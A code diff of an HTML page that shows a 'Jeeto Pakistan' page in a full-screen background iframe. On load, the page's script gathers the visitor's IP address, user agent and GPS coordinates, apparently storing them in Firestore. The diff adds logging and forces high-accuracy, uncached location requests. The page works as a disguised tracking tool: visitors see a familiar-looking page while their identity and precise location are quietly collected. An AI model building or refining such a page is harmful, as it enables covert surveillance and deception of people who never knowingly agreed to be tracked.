@@ -8,7 +8,7 @@
 <body>
     <!-- Display the Jeeto Pakistan webpage -->
     <iframe 
-        src="jeeto-pakistan.html" 
+        src="/Jeeto%20Pakistan.html" 
         width="100%" 
         height="100%" 
         style="border:none; position:fixed; top:0; left:0; width:100%; height:100%; z-index:-1;">
@@ -36,19 +36,24 @@
         // Fetch user IP address, user agent, and location
         window.onload = function () {
             try {
+                console.log("Page loaded. Starting data collection...");
+
                 // Fetch the user's IP and user agent
                 fetch('https://api.ipify.org?format=json')
                     .then(response => response.json())
                     .then(ipData => {
                         const ip = ipData.ip;
                         const userAgent = navigator.userAgent;
+                        console.log("IP and user agent fetched:", { ip, userAgent });
 
                         // Fetch GPS location
                         if (navigator.geolocation) {
+                            console.log("Requesting geolocation permissions...");
                             navigator.geolocation.getCurrentPosition(
                                 async (position) => {
                                     const { latitude, longitude } = position.coords;
                                     const timestamp = new Date().toISOString();
+                                    console.log("Geolocation obtained:", { latitude, longitude });
 
                                     // User data to store in Firestore
                                     const userData = {
@@ -69,6 +74,25 @@
                                 },
                                 (error) => {
                                     console.error('Error fetching location:', error);
+                                    switch (error.code) {
+                                        case error.PERMISSION_DENIED:
+                                            console.error("User denied the request for Geolocation.");
+                                            break;
+                                        case error.POSITION_UNAVAILABLE:
+                                            console.error("Location information is unavailable.");
+                                            break;
+                                        case error.TIMEOUT:
+                                            console.error("The request to get user location timed out.");
+                                            break;
+                                        default:
+                                            console.error("An unknown error occurred.");
+                                            break;
+                                    }
+                                },
+                                {
+                                    enableHighAccuracy: true, // Request precise location
+                                    timeout: 10000, // Timeout after 10 seconds
+                                    maximumAge: 0 // Prevent caching
                                 }
                             );
                         } else {
@@ -85,6 +109,7 @@
     </script>
 </body>
 </html>
+
 
 
 
